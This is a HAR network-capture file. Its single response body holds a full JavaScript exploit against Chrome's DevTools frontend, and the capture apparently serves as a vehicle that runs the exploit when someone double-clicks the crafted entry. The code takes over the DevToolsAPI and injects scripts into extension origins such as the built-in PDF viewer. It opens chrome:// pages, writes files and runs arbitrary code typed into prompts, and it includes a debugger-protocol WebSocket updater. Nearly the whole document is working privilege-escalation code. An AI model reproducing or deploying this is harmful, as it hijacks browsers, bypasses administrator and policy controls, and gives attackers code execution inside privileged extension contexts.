{
  "log": {
    "version": "1.2",
    "creator": {
      "name": "WebInspector",
      "version": "537.36"
    },
    "pages": [
      {
        "startedDateTime": "2025-05-08T14:24:52.087Z",
        "id": "page_1",
        "title": "javascript: (function() {eval(atob(\"\"))})()",
        "pageTimings": {
          "onContentLoad": 57.19,
          "onLoad": 57.77
        }
      }
    ],
    "entries": [
      {
        "_connectionId": "16771",
        "_initiator": {
          "type": "script",
          "stack": {
            "callFrames": [
              {
                "functionName": "",
                "scriptId": "9",
                "url": "",
                "lineNumber": 11,
                "columnNumber": 4
              }
            ]
          }
        },
        "_priority": "High",
        "_resourceType": "fetch",
        "cache": {},
        "connection": "443",
        "pageref": "page_1",
        "request": {
          "method": "GET",
          "url": "javascript: (function() {eval(atob(\"\"))})()//                    DOUBLE CLICK THIS",
          "httpVersion": "h3",
          "headers": [
            {
              "name": ":authority",
              "value": ""
            },
            {
              "name": ":method",
              "value": "GET"
            },
            {
              "name": ":path",
              "value": "javascript: (function() {eval(atob(\"\"))})()"
            },
            {
              "name": ":scheme",
              "value": "javascript"
            },
            {
              "name": "accept",
              "value": "*/*"
            },
            {
              "name": "user-agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
            }
          ],
          "queryString": [],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "",
          "httpVersion": "h3",
          "headers": [
            {
              "name": "content-type",
              "value": "application/javascript; charset=utf-8"
            }
          ],
          "cookies": [],
          "content": {
            "size": 110439,
            "mimeType": "application/javascript",
            "text": "((function () {\n    if (!opener) {\n        opener = window;\n    }\n    // alert(origin);\n\n    //     window.w = w;\n    // })\n    const w = window.opener.open(window.opener.location.origin + window.opener.location.pathname);\n    window.opener.close();\n    w.addEventListener(\"load\", async () => {\n        if (!w.DevToolsAPI) {\n            console.log(\"reloading\");\n            w.opener = null;\n            w.location.reload();\n        }\n        await sleep(500);\n        console.log(\"Got DevToolsAPI object from opened window:\", w.DevToolsAPI);\n        exploit(w);\n    });\n\n    window.w = w;\n\n\n    function exploit(w) {\n\n\n        function ui() {\n            const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\";\n            var globalUID = 0;\n            let globalMap = [];\n            function payload_swamp(w, d) {\n                const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n                const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n                console.log('hi');\n                if (location.origin.includes(\"chrome-extension://\" + pdfId)) {\n                    w.close();\n                    chrome.tabs.getCurrent(function (info) {\n                        chrome.windows.create({\n                            setSelfAsOpener: true,\n                            url: mojoURL\n                        }, function (win) {\n                            const r = win.tabs[0].id;\n                            chrome.tabs.executeScript(r, { code: `location.href = \\\"javascript:${atob('%%CHROMEPAYLOAD%%')}\\\"` });\n\n                        })\n                    })\n\n\n                    return;\n                }\n                // console.log(d);\n                // w.setTimeout(function() {\n                const blob_url = new Blob([\"alert(1)\"], { type: \"text/html\" });\n\n                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {\n                    function removeFile(file) {\n                        return new Promise(function (resolve, reject) {\n                            fs.root.getFile(file, { create: true }, function (entry) {\n                                entry.remove(resolve);\n                            })\n                        });\n                    }\n                    function writeFile(file, data) {\n                        return new Promise((resolve, reject) => {\n                            fs.root.getFile(file, { create: true }, function (entry) {\n                                entry.remove(function () {\n                                    fs.root.getFile(file, { create: true }, function (entry) {\n                                        entry.createWriter(function (writer) {\n                                            writer.write(new Blob([data]));\n                                            resolve(entry.toURL());\n                                        })\n                                    })\n                                })\n                            })\n                        })\n                    };\n                    if (d.cleanup) {\n                        console.log(\"cleaning up\");\n                        debugger;\n                        await removeFile('index.js');\n                        await removeFile('index.html');\n                        alert(\"Cleaned up successfully!\");\n                        cleanup();\n                        w.close();\n                        return;\n                    }\n                    await writeFile('index.js', atob(``))\n                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsdWF0aW9uIC0gSGFyVG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgogIAogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+CjwvYm9keT4KCjwvaHRtbD4=')}<script src=\"./index.js\" ></script>`);\n                    w.chrome.tabs.create({ url });\n                    w.close();\n                    cleanup();\n                });\n\n\n                // }, 5000);\n            \n            }\n            document.open();\n            //in order to update entry.html, replace the below string after atob(` with the base64 code of entry.html\n            document.write(atob(``));\n            document.querySelector('#activate').onclick = function () {\n                dbgext(false, pdfId);\n            }\n            onunload = function () {\n                while (true);\n            }\n            document.close();\n            document.title = \"Dashboard\";\n            document.querySelector('#activate2').onclick = function (ev) {\n\n                function xd(w) {\n                    w.close();\n                    const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n                    const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n                    chrome.tabs.getCurrent(function (tab) {\n                        console.log(tab);\n                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {\n                            async function createAndWriteFile() {\n                                function writeFile(filename, content) {\n                                    return new Promise((resolve) => {\n                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {\n                                            fs.root.getFile(filename, { create: true }, function (entry) {\n                                                entry.remove(function () {\n                                                    fs.root.getFile(filename, { create: true }, function (entry) {\n                                                        entry.createWriter(function (writer) {\n                                                            writer.write(new Blob([content]))\n                                                            writer.onwriteend = function () {\n                                                                resolve(entry.toURL());\n                                                            }\n                                                        })\n                                                    })\n                                                })\n                                            })\n                                        })\n                                    })\n\n                                }\n                                const htmlFile = `<html>\n                                <head></head><body><iframe src=\"filesystem:chrome://extensions/temporary/nothing.html\"></iframe>\n                                </html>\n                                <script>\n                                onerror=  alert;\n                                if (top !== window) {\n                                    top.location.replace(location.href);\n                                };\n                                </script>\n                                `\n                                \n                                // alert(url);\n                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');\n                                setTimeout(function () {\n                                    close();\n                                }, 800);\n                            }\n                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });\n                            function m2(url) {\n                                // alert(url);\n                                onmessage = function (data) {\n                                    if (data.data.type === \"ack\") {\n                                        \n                                        // chrome.tabs.getCurrent(function (tab) {\n                                            // alert(\"navigating\");\n                                            top.location.replace(\"\")\n                                        // })\n                                    }\n                                }\n                                top.postMessage({ type: 'acc' }, '*');\n                            }\n                            onmessage = function (dat) {\n                                if (dat.data.url) {\n                                    m2(dat.data.url);\n                                }\n                            };\n                        })\n                    })\n\n                }\n                dbgext(false, pdfId, xd.toString());\n            }\n            onmessage = function (ev) {\n                if (ev.data.type === \"browserInitNavigate\") {\n                    alert(1);\n                    ev.source.location.replace(ev.data.url);\n                }\n            }\n            document.querySelector('#updater').onclick = function (ev) {\n                onunload = null;\n                const ws = new WebSocket(\"ws://%%updaterurl%%\");\n\n                ws.onopen = function () {\n                    ws.onmessage = function (ev) {\n                        const received = JSON.parse(ev.data);\n                        const savedURL = received.params.request.url;\n                        ws.close();\n                        const w = open('', '_blank');\n                        console.log(savedURL);\n                        w.eval(`setTimeout(function () {opener.open(atob(\"${btoa(savedURL)}\"), '_blank'); window.close()}, 500);`);\n                        setTimeout(() => { location.reload() });\n                    }\n                    ws.send(JSON.stringify({\n                        method: \"Target.setDiscoverTargets\",\n                        id: 999,\n                        params: {}\n                    }));\n                }\n\n            }\n            onmessage = function (d) {\n                if (d.data.type === \"acc\") {\n                    onunload = function () { while (true); };\n                    d.source.postMessage({ type: \"ack\" }, '*');\n                    \n                };\n\n                if (!globalMap[d.data.uid]) return;\n\n                for (const frame of globalMap) {\n                    if (!frame) continue;\n                    if (frame.idx === d.data.uid) {\n                        frame.remove();\n                        delete globalMap[globalMap.indexOf(frame)];\n                        return;\n                    }\n                }\n            }\n            function dbgext(cleanup, id, payload) {\n                let x = id;\n                while (!x) {\n                    x = prompt('Extension id?');\n                    if (x === \"cancel\") {\n                        return;\n                    }\n                }\n                let path = '//manifest.json';\n                let is_pdf = false;\n                let injected = payload ?? payload_swamp.toString();\n                if (x === pdfId) {\n                    path = \"index.html\"; // pdf viewer hack\n                    is_pdf = true;\n                    const b = prompt(\"code to execute!\");\n                    if (!b) return;\n                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));\n                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');\n                    \n                }\n                const URL_1 = `chrome-extension://${x ??\n                    alert(\"NOTREACHED\")}/${path}`;\n                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: \"remove\", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);\n                const ifr = document.createElement(\"iframe\");\n                ifr.src = URL_1;\n                document.body.appendChild(ifr);\n                const ifrid = globalMap.push(ifr) - 1;\n                ifr.idx = ifrid;\n                ifr.onload = function () {\n\n                    ifr.contentWindow.postMessage({\n                        type: \"uidpass\", passcode:\n                            ifrid,\n                        cleanup: cleanup\n                    }, '*');\n                    // console.log('hi');\n                }\n                // alert(1);\n\n            }\n            document.querySelector('#extdbg').onclick = function () {\n                dbgext(false);\n            }\n            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {\n                let extid = el.getAttribute(\"ext\");\n                console.log(el.innerText, extid);\n                dbgext(false, extid);\n                }\n            });\n            document.querySelector('#cleanup').onclick = function () {\n                dbgext(true);\n            }\n            document.querySelector('#devdbg').onclick = function () {\n                var l_canceled = false;\n                const id = setTimeout(function m() {\n                    if (l_canceled) return;\n                    (new Function(prompt(\"Evaluate script! (type 'cancel' to cancel)\")))();\n                    if (!l_canceled) setTimeout(m, 0);\n                    clearTimeout(id);\n                });\n                Object.defineProperty(window, 'cancel', {\n                    get: function () {\n                        l_canceled = true;\n                    }, configurable: true\n                })\n                return;\n            }\n            console.log(globalMap);\n        }\n        w.eval(`(${ui.toString()})()`);\n        window.close();\n\n    }\n\n    function sleep(ms) {\n        return new Promise(resolve => {\n            setTimeout(resolve, ms);\n        });\n    }\n})\n)()"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1
        },
        "serverIPAddress": "0.0.0.0",
        "startedDateTime": "2025-05-08T14:24:52.087Z",
        "time": 100,
        "timings": {
          "blocked": 0,
          "dns": 0,
          "ssl": 0,
          "connect": 0,
          "send": 0,
          "wait": 50,
          "receive": 50,
          "_blocked_queueing": 0
        }
      }
    ]
  }
}
